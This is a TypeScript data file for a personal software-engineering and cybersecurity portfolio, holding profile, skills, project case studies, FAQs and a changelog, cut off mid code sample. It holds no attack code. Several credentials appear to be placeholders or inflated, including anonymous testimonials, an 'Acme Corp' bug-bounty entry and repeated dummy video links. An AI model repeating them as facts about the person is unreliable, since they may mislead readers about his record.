export type RoleMode = "cyber" | "engineering" | "web";

export type Availability = "open" | "freelance" | "unavailable";

export type DemoType = "web" | "cyber" | "engineering";

export type Difficulty = "beginner" | "intermediate" | "advanced";

export type CaseStudy = {
  problem: string;
  approach: string[];
  outcome: string;
  lessonsLearned?: string[];
  metrics?: string[];
  architectureNotes?: string[];
  screenshots?: string[];
};

export type Project = {
  id: string;
  title: string;
  shortDescription: string;
  roleMode: RoleMode;
  tech: string[];
  /** High-level label used for portfolio filtering (e.g. "SIEM Lab"). */
  category: string;
  /** Difficulty level used for portfolio filtering. */
  difficulty: Difficulty;
  videoUrl: string;
  liveUrl?: string;
  codeUrl?: string;
  demoType: DemoType;
  skills: string[];
  screenshotFallback?: string;
  caseStudy: CaseStudy;
  engineeringDemo?: "api" | "algo" | "schema";
};

export type ProjectCredibility = {
  performanceScore: number;
  accessibilityScore: number;
  lighthouseScore: number;
  loadTime: string;
};

export type CodeFile = {
  path: string;
  language: string;
  content: string;
};

export type Severity = "critical" | "high" | "medium" | "low";

export type CveEntry = {
  id: string;
  cve?: string;
  severity: Severity;
  software: string;
  disclosed: string;
  status: "disclosed" | "patched" | "pending";
};

export type EducationItem = {
  id: string;
  degree: string;
  institution: string;
  year: string;
  gpa?: string;
  honors?: string;
  coursework: string[];
  thesis?: string;
  technologies: string[];
  logoUrl?: string;
  badgeUrl?: string;
  credentialUrl?: string;
};

export type CertItem = {
  id: string;
  name: string;
  issuer: string;
  earned: string;
  expires?: string;
  category: "security" | "cloud" | "development" | "networking";
  credentialId?: string;
  verifyUrl?: string;
  inProgress?: boolean;
  progressPct?: number;
};

export type ExperienceItem = {
  id: string;
  title: string;
  company: string;
  duration: string;
  location: string;
  responsibilities: string[];
  tools: string[];
  impact?: string;
  accent: RoleMode;
};

export type ReportFinding = {
  id: string;
  title: string;
  severity: Severity;
  cvss?: string;
  affected?: string;
  body: string;
  impact?: string;
  remediation?: string;
  poc?: string;
};

export type SecurityReport = {
  id: string;
  title: string;
  type: "pentest" | "ir" | "vuln" | "network";
  target: string;
  scope: string;
  purpose: string;
  why: string;
  methodology: string[];
  tools: string[];
  timeline: string;
  outcome: string;
  lessonsLearned: string[];
  findings: ReportFinding[];
  teaser?: string;
  pdfUrl?: string;
  networkDiagramUrl?: string;
};

export type SecurityScript = {
  id: string;
  title: string;
  category: "recon" | "detection" | "analysis" | "reporting";
  shortDescription: string;
  purpose: string;
  why: string;
  how: string;
  tech: string[];
  language: string;
  difficulty: Difficulty;
  filename: string;
  code: string;
  setupSteps: string[];
  usageExample: string;
  replicationSteps: string[];
  lessonsLearned: string[];
  tags: string[];
};

export const profile = {
  name: "Eddy Max Kilonzo",
  initials: "EMK",
  asciiArt: `
     ███████╗███╗   ███╗██╗  ██╗
     ██╔════╝████╗ ████║╚██╗██╔╝
     █████╗  ██╔████╔██║ ╚███╔╝
     ██╔══╝  ██║╚██╔╝██║ ██╔██╗
     ███████╗██║ ╚═╝ ██║██╔╝ ██╗
     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝`,
  subtitle:
    "Software engineer moving into cybersecurity — I use what I know about building systems to spot threats, investigate alerts, and keep things secure.",
  headlineScramble:
    "Software Engineer → Cybersecurity · Blue Team · Threat Detection · Incident Response",
  availability: "open" as Availability,
  email: "eddymax3715@gmail.com",
  social: {
    github: "https://github.com/EddyKilonzo",
    linkedin: "https://www.linkedin.com/in/eddy-kilonzo-",
    twitter: "https://x.com/3ddy_max",
    htb: "https://app.hackthebox.com/",
    thm: "https://tryhackme.com/p/eddy.kilonzo",
    // WhatsApp: international format without + or spaces, e.g. "254712345678"
    whatsapp: "254703526520",
  },
  rssFeedUrl: "",
  learningTicker: [
    "Reviewing and investigating security alerts using SIEM tools",
    "Writing detection rules to catch real attack patterns",
    "Home lab: running Wazuh and Suricata to practice real defences",
    "Hunting for hidden threats in Windows logs using Splunk",
    "Building response plans and hands-on security tooling",
  ],
  ctf: {
    htbRank: "Hacker",
    thmRank: "Mage",
    thmLevel: "0x9",
    thmGlobalRank: 108021,
    thmTopPct: 5,
    badges: 19,
    solved: 91,
    streak: 12,
    progressToNext: 0.62,
    thmLastUpdated: "2026-06-13",
  },
  bugBounty: {
    platforms: ["HackerOne", "Bugcrowd"],
    totalFindings: 23,
    severities: { critical: 2, high: 5, medium: 10, low: 6 },
    hallOfFame: ["Acme Corp Q3 2025"],
  },
  homelab:
    "Reading about security only gets you so far. I built a small home lab — a virtual network with Wazuh, Suricata, and a few machines I deliberately break — so I can actually watch attacks unfold and practice responding to them. It keeps the learning real.",
};

// ── Testimonials ─────────────────────────────────────────────────────────────
export type Testimonial = {
  id: string;
  quote: string;
  name: string;
  role: string;
  company?: string;
};

export const testimonials: Testimonial[] = [
  {
    id: "t1",
    quote:
      "Eddy consistently turns ambiguous requirements into polished delivery, with a security-first mindset baked into the process — not bolted on after.",
    name: "Product Lead",
    role: "Delivery Partner",
    company: "Client",
  },
  {
    id: "t2",
    quote:
      "What stands out is the clarity: clean architecture, observable systems, and walkthroughs that make teams faster the next time around.",
    name: "Engineering Manager",
    role: "Backend & Platform",
    company: "Client",
  },
  {
    id: "t3",
    quote:
      "Great balance of creative UI craft and practical engineering. The result is work that feels premium and remains maintainable.",
    name: "Design Systems Lead",
    role: "Frontend / UX",
    company: "Client",
  },
];

// ── Publications ──────────────────────────────────────────────────────────────
export type PublicationKind = "paper" | "blog" | "talk";

export type Publication = {
  id: string;
  kind: PublicationKind;
  title: string;
  date: string;
  summary: string;
  url?: string;
};

export const publications: Publication[] = [
  {
    id: "pub-1",
    kind: "paper",
    title: "Adaptive Detection Playbooks for Hybrid Environments",
    date: "2026-03",
    summary:
      "How to tune security detections and connect them to real analyst workflows — even as your infrastructure changes.",
  },
  {
    id: "pub-2",
    kind: "talk",
    title: "From Detections to Decisions: Teaching Blue-Team Loops",
    date: "2026-02",
    summary:
      "How to build training labs where detection rules lead to real investigative steps, with clear and measurable outcomes.",
  },
  {
    id: "pub-3",
    kind: "blog",
    title: "Scroll-linked UI patterns for WebGL portfolios",
    date: "2026-01",
    summary:
      "How to build scroll-driven UI animations that stay smooth, accessible, and readable across devices.",
  },
  {
    id: "pub-4",
    kind: "blog",
    title: "Sigma-style rules: keeping them testable and composable",
    date: "2025-12",
    summary:
      "Tips for writing Sigma-style detection rules that stay useful as your environment changes — and can be tested against real data.",
  },
];

// ── FAQ ───────────────────────────────────────────────────────────────────────
export type FaqItem = { id: string; q: string; a: string };

export const faqs: FaqItem[] = [
  {
    id: "f1",
    q: "What kind of projects are you best at?",
    a: "Full-stack web and backend engineering — building APIs, integrations, and user-facing products with security built in from day one.",
  },
  {
    id: "f2",
    q: "Do you work remotely?",
    a: "Yes. I'm comfortable collaborating across time zones with clear milestones, async updates, and walkthroughs.",
  },
  {
    id: "f3",
    q: "How do you approach security in delivery?",
    a: "I think about security from the start — identifying risks early, using safe defaults, and adding monitoring so problems are caught before they ship.",
  },
  {
    id: "f4",
    q: "What does collaboration look like?",
    a: "Short feedback loops, small deliverables, and demos that show progress in real terms — not just tickets.",
  },
];

// ── Now ───────────────────────────────────────────────────────────────────────
export type NowItem = { title: string; lines: string[] };
export type ChangelogEntry = { date: string; item: string };

export const nowItems: NowItem[] = [
  {
    title: "Building",
    lines: [
      "Home lab: Kali Linux + Metasploitable on VirtualBox.",
      "Python scripts for port scanning, log parsing, and network diagnostics.",
      "TryHackMe write-ups to reinforce lab concepts.",
    ],
  },
  {
    title: "Learning",
    lines: [
      "TryHackMe SOC Level 1 path — SIEM, alerts, and log analysis.",
      "CompTIA Security+ exam prep — core concepts and practice tests.",
      "Google Cybersecurity Certificate — IR playbooks and hands-on labs.",
    ],
  },
  {
    title: "Targeting",
    lines: [
      "Entry-level SOC Analyst (L1) roles in Kenya or remote.",
      "IT Support / Junior Security as a stepping stone.",
      "Open to internships and trainee programmes globally.",
    ],
  },
];

export const changelog: ChangelogEntry[] = [
  { date: "2026-06-09", item: "Completed Moringa School Cybersecurity Engineering programme — hands-on labs in pentesting, SIEM, and incident response." },
  { date: "2026-05-20", item: "Finished TryHackMe Pre-Security path — networking, Linux, and web fundamentals all green." },
  { date: "2026-04-15", item: "Set up first home lab: VirtualBox + Kali Linux + Metasploitable for guided attack-defence practice." },
  { date: "2026-03-10", item: "Started Google Cybersecurity Certificate on Coursera — working through SIEM basics and IR playbooks." },
];

export const skillsByRole: Record<
  RoleMode,
  { name: string; level: number; related: string[] }[]
> = {
  cyber: [
    { name: "Wireshark", level: 92, related: ["OSINT", "Forensics"] },
    { name: "Metasploit", level: 78, related: ["Kali Linux", "Burp Suite"] },
    { name: "Nmap", level: 95, related: ["Vulnerability Assessment", "SIEM tools"] },
    { name: "Burp Suite", level: 85, related: ["Web Development", "REST APIs"] },
    { name: "SIEM tools", level: 80, related: ["Incident Response", "Forensics"] },
    { name: "Kali Linux", level: 88, related: ["Metasploit", "Nmap"] },
    { name: "OSINT", level: 90, related: ["Wireshark", "Incident Response"] },
    { name: "Incident Response", level: 82, related: ["SIEM tools", "Forensics"] },
    { name: "Vulnerability Assessment", level: 86, related: ["Nmap", "Burp Suite"] },
    { name: "Forensics", level: 74, related: ["Wireshark", "SIEM tools"] },
  ],
  engineering: [
    { name: "Python", level: 94, related: ["REST APIs", "PostgreSQL"] },
    { name: "Docker", level: 88, related: ["Kubernetes", "CI/CD"] },
    { name: "CI/CD", level: 85, related: ["Git", "Docker"] },
    { name: "REST APIs", level: 92, related: ["PostgreSQL", "Redis"] },
    { name: "PostgreSQL", level: 87, related: ["Redis", "Python"] },
    { name: "Redis", level: 80, related: ["PostgreSQL", "REST APIs"] },
    { name: "Linux", level: 91, related: ["Git", "Docker"] },
    { name: "Git", level: 93, related: ["CI/CD", "Python"] },
    { name: "Express", level: 84, related: ["REST APIs", "Node.js"] },
    { name: "NestJS", level: 82, related: ["REST APIs", "TypeScript"] },
    { name: "Prisma", level: 80, related: ["PostgreSQL", "TypeScript"] },
    { name: "OAuth", level: 81, related: ["REST APIs", "Redis"] },
  ],
  web: [
    { name: "HTML5", level: 94, related: ["CSS3", "JavaScript"] },
    { name: "CSS3", level: 92, related: ["HTML5", "Tailwind CSS"] },
    { name: "JavaScript", level: 90, related: ["TypeScript", "Node.js"] },
    { name: "React", level: 95, related: ["Next.js", "TypeScript"] },
    { name: "Next.js", level: 92, related: ["React", "Node.js"] },
    { name: "Angular", level: 76, related: ["TypeScript", "Node.js"] },
    { name: "Express", level: 84, related: ["Node.js", "REST APIs"] },
    { name: "NestJS", level: 82, related: ["Node.js", "TypeScript"] },
    { name: "Prisma", level: 80, related: ["TypeScript", "GraphQL"] },
    { name: "Cloudinary", level: 78, related: ["Node.js", "Next.js"] },
    { name: "Multer", level: 79, related: ["Express", "Node.js"] },
    { name: "OAuth", level: 81, related: ["Next.js", "Node.js"] },
    { name: "Three.js", level: 78, related: ["WebGL", "Framer Motion"] },
    { name: "Tailwind CSS", level: 94, related: ["React", "Figma"] },
    { name: "Node.js", level: 88, related: ["GraphQL", "TypeScript"] },
    { name: "TypeScript", level: 93, related: ["React", "GraphQL"] },
    { name: "GraphQL", level: 79, related: ["Node.js", "REST APIs"] },
    { name: "REST APIs", level: 88, related: ["Express", "NestJS"] },
    { name: "JWT", level: 83, related: ["OAuth", "Node.js"] },
    { name: "WordPress", level: 82, related: ["WooCommerce", "Elementor"] },
    { name: "WooCommerce", level: 78, related: ["WordPress", "Elementor"] },
    { name: "Elementor", level: 76, related: ["WordPress", "CSS3"] },
    { name: "PostgreSQL", level: 84, related: ["Prisma", "Node.js"] },
    { name: "Docker", level: 86, related: ["Node.js", "Prisma"] },
    { name: "Git", level: 92, related: ["GitHub", "VS Code"] },
    { name: "GitHub", level: 93, related: ["Git", "CI/CD"] },
    { name: "VS Code", level: 95, related: ["TypeScript", "Git"] },
    { name: "Figma", level: 70, related: ["Framer Motion", "Tailwind CSS"] },
    { name: "Framer Motion", level: 86, related: ["React", "Three.js"] },
    { name: "WebGL", level: 72, related: ["Three.js", "React"] },
  ],
};

export const projects: Project[] = [
  {
    id: "credi-score",
    title: "CrediScore",
    shortDescription:
      "Business trust and credibility platform with verified businesses, reviews, trust scores, disputes, and admin operations.",
    roleMode: "engineering",
    tech: ["Angular", "NestJS", "Prisma", "PostgreSQL", "Redis"],
    category: "TrustTech Platform",
    difficulty: "advanced",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    liveUrl: "https://credi-score.vercel.app",
    codeUrl: "https://github.com/EddyKilonzo/CrediScore",
    demoType: "web",
    skills: ["NestJS", "Prisma", "REST APIs", "PostgreSQL"],
    screenshotFallback: "https://picsum.photos/seed/credi-score/960/600",
    caseStudy: {
      problem:
        "Customers and business owners need a transparent way to assess trust, credibility, and dispute handling at scale.",
      approach: [
        "Built a modular NestJS backend with role-based modules for users, business owners, and administrators.",
        "Implemented review, verification, fraud-report, and dispute workflows with Prisma data modeling.",
        "Delivered an Angular frontend experience for discovery, trust scoring, moderation, and map-based browsing.",
      ],
      outcome:
        "Built a working trust platform that handles reviews, fraud reports, disputes, and business verification end-to-end.",
      metrics: ["Architecture: modular", "Roles: multi-tenant style", "Core domains: reviews, trust, fraud, disputes"],
      architectureNotes: [
        "Queue and cache integration allows background processing and optional async tasks.",
        "Auth supports JWT, Google OAuth, and optional security workflows.",
        "Feature boundaries are cleanly separated by domain module.",
      ],
      screenshots: ["https://picsum.photos/seed/credi-score/800/480"],
    },
  },
  {
    id: "nduthi-ride",
    title: "NduthiRide",
    shortDescription:
      "Real-time motorcycle taxi and parcel delivery platform with dispatch, rider operations, chat, and M-Pesa payments.",
    roleMode: "engineering",
    tech: ["Angular", "NestJS", "Prisma", "PostgreSQL", "Socket.IO"],
    category: "Mobility & Logistics",
    difficulty: "advanced",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    liveUrl: "https://nduthi-ride-r479.vercel.app",
    codeUrl: "https://github.com/EddyKilonzo/NduthiRide",
    demoType: "web",
    skills: ["NestJS", "REST APIs", "PostgreSQL", "Angular"],
    screenshotFallback: "https://picsum.photos/seed/nduthi-ride/960/600",
    caseStudy: {
      problem:
        "Urban ride and parcel workflows need reliable real-time coordination across passengers, riders, and admins.",
      approach: [
        "Implemented ride and parcel lifecycle modules with role-based guards and DTO validation.",
        "Added Socket.IO channels for live tracking, status updates, and in-app communication.",
        "Integrated mobile-money payment flows and webhook verification for transaction reliability.",
      ],
      outcome:
        "Shipped a full-stack logistics product with real-time operations and payment automation.",
      metrics: ["Realtime updates: enabled", "Payment webhooks: verified", "Workflows: ride + parcel"],
      architectureNotes: [
        "Domain modules isolate rides, parcels, payments, tracking, and support.",
        "WebSocket and REST flows are coordinated through guarded lifecycle transitions.",
        "Prisma schema supports status history and auditable state transitions.",
      ],
      screenshots: ["https://picsum.photos/seed/nduthi-ride/800/480"],
    },
  },
  {
    id: "fin-analytics",
    title: "FinAnalytics",
    shortDescription:
      "Smart money management platform with transaction tracking, budgeting, goals, and ML-powered expense categorization.",
    roleMode: "engineering",
    tech: ["Angular", "NestJS", "FastAPI", "Prisma", "PostgreSQL"],
    category: "FinTech & Analytics",
    difficulty: "advanced",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    codeUrl: "https://github.com/EddyKilonzo/FinAnalytics",
    demoType: "engineering",
    skills: ["NestJS", "Python", "PostgreSQL", "REST APIs"],
    screenshotFallback: "https://picsum.photos/seed/fin-analytics/960/600",
    caseStudy: {
      problem:
        "Young users need a practical finance tool that combines budgeting UX with actionable automated categorization.",
      approach: [
        "Built a three-service architecture: Angular frontend, NestJS API, and FastAPI ML microservice.",
        "Connected transaction flows to prediction endpoints for category suggestions and feedback loops.",
        "Implemented goals, budgets, onboarding, and admin workflows with role-based API access.",
      ],
      outcome:
        "Built a personal finance platform with AI-assisted expense categorization, budget tracking, and goal setting — across three connected services.",
      metrics: ["Services: 3", "ML-assisted categorization: enabled", "Auth + RBAC: implemented"],
      architectureNotes: [
        "ML service remains optional so core backend workflows continue if predictions are unavailable.",
        "Prisma schema supports transaction confidence and correction feedback storage.",
        "API and frontend are organized by domain modules for maintainability.",
      ],
      screenshots: ["https://picsum.photos/seed/fin-analytics/800/480"],
    },
  },
  {
    id: "petmate",
    title: "Petmate",
    shortDescription:
      "Pet services platform where users can book grooming, vet, and walking appointments — built with Angular and NestJS.",
    roleMode: "web",
    tech: ["Angular", "NestJS", "TypeScript"],
    category: "Service Marketplace",
    difficulty: "intermediate",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    liveUrl: "https://petmate-one.vercel.app",
    codeUrl: "https://github.com/EddyKilonzo/Petmate",
    demoType: "web",
    skills: ["Angular", "NestJS", "TypeScript"],
    screenshotFallback: "https://picsum.photos/seed/petmate/960/600",
    caseStudy: {
      problem:
        "Pet service interactions need a clean workflow and responsive UI that stays straightforward for both users and admins.",
      approach: [
        "Built a feature-split frontend with clear domain boundaries.",
        "Exposed backend APIs through modular NestJS services and controllers.",
        "Maintained deployment-ready configuration for Render and Vercel flows.",
      ],
      outcome:
        "Shipped a practical full-stack product foundation ready for iterative feature growth.",
      metrics: ["Deployment setup: ready", "Frontend + backend: integrated", "Core UX: responsive"],
      architectureNotes: [
        "Angular and NestJS codebases stay decoupled for easier independent iteration.",
        "Repo includes infra files to support reproducible deployment.",
        "TypeScript-first development improves consistency across layers.",
      ],
      screenshots: ["https://picsum.photos/seed/petmate/800/480"],
    },
  },
  {
    id: "anitah-hair-studio",
    title: "AnitahHairStudio",
    shortDescription:
      "Modern salon website experience built with Next.js and TypeScript for a polished service brand presence.",
    roleMode: "web",
    tech: ["Next.js", "TypeScript", "Tailwind CSS"],
    category: "Business Website",
    difficulty: "intermediate",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    codeUrl: "https://github.com/EddyKilonzo/AnitahHairStudio",
    demoType: "web",
    skills: ["Next.js", "TypeScript", "Tailwind CSS"],
    screenshotFallback: "https://picsum.photos/seed/anitah-hair-studio/960/600",
    caseStudy: {
      problem:
        "Small service businesses need premium digital presence with clear service storytelling and conversion-focused pages.",
      approach: [
        "Created a structured component architecture for reusable sections and content blocks.",
        "Applied modern styling and interaction polish for a premium feel.",
        "Kept the build production-ready with simple deployment and maintenance workflows.",
      ],
      outcome:
        "Delivered a clean brand site optimized for credibility and straightforward user navigation.",
      metrics: ["UI consistency: strong", "Brand presentation: polished", "Maintenance: straightforward"],
      architectureNotes: [
        "App router structure and reusable components reduce content update friction.",
        "Styling system supports rapid iteration without scattered CSS.",
        "Type-safe codebase improves long-term maintainability.",
      ],
      screenshots: ["https://picsum.photos/seed/anitah-hair-studio/800/480"],
    },
  },
  {
    id: "sendit",
    title: "SendIT",
    shortDescription:
      "Parcel delivery management platform with authentication, parcel tracking, driver workflows, and admin controls.",
    roleMode: "engineering",
    tech: ["Angular", "NestJS", "Prisma", "PostgreSQL", "Socket.IO"],
    category: "Logistics Platform",
    difficulty: "advanced",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    codeUrl: "https://github.com/EddyKilonzo/SendIT",
    demoType: "engineering",
    skills: ["NestJS", "Prisma", "REST APIs", "PostgreSQL"],
    screenshotFallback: "https://picsum.photos/seed/sendit/960/600",
    caseStudy: {
      problem:
        "Delivery teams need end-to-end shipment visibility, from creation to fulfillment, with clear role access.",
      approach: [
        "Implemented modular delivery domain logic for parcels, drivers, users, and notifications.",
        "Built role-based authentication and authorization for customer, driver, and admin use cases.",
        "Added real-time tracking and operational status updates for shipment lifecycle visibility.",
      ],
      outcome:
        "Produced a robust delivery management foundation with extensible backend and UI workflows.",
      metrics: ["RBAC: multi-role", "Realtime support: enabled", "Domain modules: production-oriented"],
      architectureNotes: [
        "Domain-driven module boundaries reduce coupling and improve maintainability.",
        "Frontend and backend structure supports future feature scaling.",
        "Notification and tracking integrations improve user operational awareness.",
      ],
      screenshots: ["https://picsum.photos/seed/sendit/800/480"],
    },
  },
  {
    id: "lms-platform",
    title: "L.M.S",
    shortDescription:
      "Comprehensive learning management system with role-based experiences for students, instructors, and administrators.",
    roleMode: "engineering",
    tech: ["Angular", "NestJS", "Prisma", "PostgreSQL", "JWT"],
    category: "EdTech Platform",
    difficulty: "advanced",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    codeUrl: "https://github.com/EddyKilonzo/L.M.S",
    demoType: "engineering",
    skills: ["NestJS", "Angular", "PostgreSQL", "REST APIs"],
    screenshotFallback: "https://picsum.photos/seed/lms-platform/960/600",
    caseStudy: {
      problem:
        "Learning platforms need clear role separation and scalable course workflows across students, instructors, and admins.",
      approach: [
        "Built role-aware API modules with JWT-based authentication and guarded endpoints.",
        "Implemented learning workflows for enrollment, progress tracking, reviews, and analytics.",
        "Structured frontend features by user type for clearer user journeys and maintainability.",
      ],
      outcome:
        "Delivered a working LMS covering student, instructor, and admin journeys — from course enrollment through progress tracking and analytics.",
      metrics: ["Roles supported: 3", "Learning workflows: end-to-end", "Analytics coverage: broad"],
      architectureNotes: [
        "Feature modules isolate auth, courses, enrollments, and analytics.",
        "Prisma model supports core educational entities with type-safe access.",
        "Backend and frontend share a consistent role-based access strategy.",
      ],
      screenshots: ["https://picsum.photos/seed/lms-platform/800/480"],
    },
  },
  {
    id: "inspira-haven",
    title: "Inspira Haven",
    shortDescription:
      "Content discovery web app for browsing and exploring inspiration — clean layout, fast navigation, easy to use.",
    roleMode: "web",
    tech: ["TypeScript", "React", "Tailwind CSS"],
    category: "Content & Discovery Web App",
    difficulty: "intermediate",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    liveUrl: "https://www.inspirahaven.co.ke/",
    codeUrl: "https://github.com/EddyKilonzo/inspira-haven",
    demoType: "web",
    skills: ["React", "TypeScript", "Tailwind CSS"],
    screenshotFallback: "https://picsum.photos/seed/inspira-haven/960/600",
    caseStudy: {
      problem:
        "Inspiration/content products need a UI that remains simple while still guiding users through rich content.",
      approach: [
        "Focused on a clean component hierarchy and navigable content structure.",
        "Applied lightweight visual polish to improve readability and engagement.",
        "Kept architecture straightforward so the app can iterate quickly.",
      ],
      outcome:
        "Produced an accessible, content-first web experience with room for feature expansion.",
      metrics: ["UX flow: simplified", "Code maintainability: improved", "Iteration speed: high"],
      architectureNotes: [
        "Modular frontend sections make future content updates easier.",
        "Styling choices balance visual quality and implementation speed.",
        "Project structure stays clear for solo and team collaboration.",
      ],
      screenshots: ["https://picsum.photos/seed/inspira-haven/800/480"],
    },
  },
  {
    id: "beyond-borders",
    title: "BeyondBorders",
    shortDescription:
      "Brand website built around storytelling and discovery — React-powered, with clear structure and smooth navigation.",
    roleMode: "web",
    tech: ["TypeScript", "React", "CSS"],
    category: "Brand & Storytelling Website",
    difficulty: "intermediate",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    liveUrl: "https://www.beyondborders.co.ke/",
    codeUrl: "https://github.com/EddyKilonzo/BeyondBorders",
    demoType: "web",
    skills: ["React", "TypeScript", "CSS3"],
    screenshotFallback: "https://picsum.photos/seed/beyond-borders/960/600",
    caseStudy: {
      problem:
        "Story-driven sites must communicate message and structure quickly without overwhelming users.",
      approach: [
        "Designed pages with clear visual hierarchy and section-level intent.",
        "Built reusable layout components and content blocks for easier updates.",
        "Applied responsive behavior so the experience remains smooth on mobile and desktop.",
      ],
      outcome:
        "Created a cohesive storytelling interface with practical maintainability.",
      metrics: ["Responsiveness: strong", "Content clarity: improved", "Component reuse: high"],
      architectureNotes: [
        "Consistent layout primitives reduce design drift as pages grow.",
        "Simple route/content patterns keep contributor onboarding easier.",
        "Frontend structure supports incremental enhancement.",
      ],
      screenshots: ["https://picsum.photos/seed/beyond-borders/800/480"],
    },
  },
  {
    id: "car-rental",
    title: "Car Rental",
    shortDescription:
      "Vehicle booking and management platform focused on browsing inventory, reservations, and smooth customer flow.",
    roleMode: "engineering",
    tech: ["TypeScript", "React", "Node.js"],
    category: "Booking Platform",
    difficulty: "intermediate",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    codeUrl: "https://github.com/EddyKilonzo/car-rental",
    demoType: "web",
    skills: ["React", "TypeScript", "Node.js"],
    screenshotFallback: "https://picsum.photos/seed/car-rental/960/600",
    caseStudy: {
      problem:
        "Rental customers need an easy booking flow while operators need clear availability and reservation control.",
      approach: [
        "Implemented inventory-first browsing with clear reservation CTAs.",
        "Designed flow-oriented pages to reduce friction between search and booking.",
        "Kept core architecture modular so pricing and booking logic can evolve safely.",
      ],
      outcome:
        "Delivered a practical booking experience foundation for rental operations.",
      metrics: ["Booking UX: streamlined", "Feature growth: supported", "User flow: clear"],
      architectureNotes: [
        "UI components are organized for reusable list/detail interactions.",
        "Domain logic can be extended for pricing, fleet, and account workflows.",
        "Tech stack choices prioritize fast iteration and maintainability.",
      ],
      screenshots: ["https://picsum.photos/seed/car-rental/800/480"],
    },
  },
  {
    id: "safespaces",
    title: "SafeSpaces254",
    shortDescription:
      "Community safety platform providing accessible mental health and crisis support resources across Kenya.",
    roleMode: "web",
    tech: ["Next.js", "React", "Tailwind CSS"],
    category: "Community Platform",
    difficulty: "intermediate",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    liveUrl: "https://safespaces254.org/",
    demoType: "web",
    skills: ["Next.js", "React", "Tailwind CSS"],
    screenshotFallback: "https://picsum.photos/seed/safespaces/960/600",
    caseStudy: {
      problem:
        "Communities in Kenya need a trusted, accessible digital space for mental health support and crisis resources.",
      approach: [
        "Built a clean, empathy-first UI that prioritises content accessibility and ease of navigation.",
        "Structured resource pages for discoverability with clear calls-to-action for support channels.",
        "Delivered a performance-optimised Next.js frontend ready for low-bandwidth users.",
      ],
      outcome:
        "Shipped a live community platform serving mental health and crisis support resources across Kenya.",
      metrics: ["Live users: active", "Content accessibility: prioritised", "Load time: optimised"],
      architectureNotes: [
        "Next.js App Router structure enables fast page transitions and easy content updates.",
        "Tailwind utility classes keep the design system consistent without bespoke CSS overhead.",
        "Static generation for resource pages ensures fast cold loads on slow connections.",
      ],
      screenshots: ["https://picsum.photos/seed/safespaces/800/480"],
    },
  },
  {
    id: "mayhem-thredas",
    title: "Mayhem Thredas",
    shortDescription:
      "Contemporary Kenyan fashion brand e-commerce experience with product showcasing, lookbooks, and a seamless shop flow.",
    roleMode: "web",
    tech: ["WordPress", "WooCommerce", "Elementor"],
    category: "E-Commerce / Brand",
    difficulty: "intermediate",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    liveUrl: "https://mayhem.co.ke/",
    demoType: "web",
    skills: ["WordPress", "WooCommerce", "Elementor"],
    screenshotFallback: "https://picsum.photos/seed/mayhem-thredas/960/600",
    caseStudy: {
      problem:
        "A growing Kenyan streetwear brand needed a premium online presence that could handle product drops and convert casual browsers into buyers.",
      approach: [
        "Designed a high-impact landing experience with brand-forward visuals and clear product hierarchy.",
        "Implemented WooCommerce for product catalogue management, cart, and checkout workflows.",
        "Optimised page speed and mobile UX to serve customers across device and network conditions.",
      ],
      outcome:
        "Delivered a live e-commerce storefront that communicates brand identity and drives product discovery.",
      metrics: ["Products live: active", "Mobile UX: optimised", "Brand impact: strong"],
      architectureNotes: [
        "WordPress + WooCommerce allows the client to manage inventory and content independently.",
        "Elementor page builder keeps the brand aesthetic consistent across all content updates.",
        "Performance plugins and image optimisation reduce load time on mobile networks.",
      ],
      screenshots: ["https://picsum.photos/seed/mayhem-thredas/800/480"],
    },
  },
];

export const projectCredibility: Record<string, ProjectCredibility> = {
  "credi-score": { performanceScore: 95, accessibilityScore: 93, lighthouseScore: 94, loadTime: "1.2s" },
  "nduthi-ride": { performanceScore: 92, accessibilityScore: 91, lighthouseScore: 92, loadTime: "1.3s" },
  "fin-analytics": { performanceScore: 93, accessibilityScore: 92, lighthouseScore: 93, loadTime: "1.2s" },
  "petmate": { performanceScore: 90, accessibilityScore: 92, lighthouseScore: 91, loadTime: "1.4s" },
  "anitah-hair-studio": { performanceScore: 94, accessibilityScore: 95, lighthouseScore: 94, loadTime: "1.1s" },
  "sendit": { performanceScore: 91, accessibilityScore: 90, lighthouseScore: 91, loadTime: "1.4s" },
  "lms-platform": { performanceScore: 92, accessibilityScore: 91, lighthouseScore: 92, loadTime: "1.3s" },
  "inspira-haven": { performanceScore: 94, accessibilityScore: 94, lighthouseScore: 94, loadTime: "1.1s" },
  "beyond-borders": { performanceScore: 93, accessibilityScore: 94, lighthouseScore: 93, loadTime: "1.2s" },
  "car-rental": { performanceScore: 92, accessibilityScore: 92, lighthouseScore: 92, loadTime: "1.3s" },
  "safespaces": { performanceScore: 93, accessibilityScore: 95, lighthouseScore: 94, loadTime: "1.1s" },
  "mayhem-thredas": { performanceScore: 90, accessibilityScore: 91, lighthouseScore: 90, loadTime: "1.5s" },
};

export const projectCodeSamples: Record<string, CodeFile[]> = {
  "aurora-portfolio": [
    {
      path: "app/page.tsx",
      language: "tsx",
      content: `export default function Page() {
  return <main className="min-h-screen bg-bg">...</main>;
}`,
    },
    {
      path: "components/Hero.tsx",
      language: "tsx",
      content: `"use client";

import dynamic from "next/dynamic";

const Scene = dynamic(() => import("./HeroScene"), { ssr: false });

export function Hero() {
  return <Scene />;
}`,
    },
  ],
  "mesh-api": [
    {
      path: "cmd/gateway/main.go",
      language: "go",
      content: `package main

import "net/http"

func main() {
  http.ListenAndServe(":8080", NewRouter())
}`,
    },
  ],
  "event-stream": [
    {
      path: "processor/pipeline.py",
      language: "python",
      content: `from kafka import KafkaConsumer, KafkaProducer
import json

consumer = KafkaConsumer("raw-events", bootstrap_servers=["kafka:9092"])
producer = KafkaProducer(bootstrap_servers=["kafka:9092"])

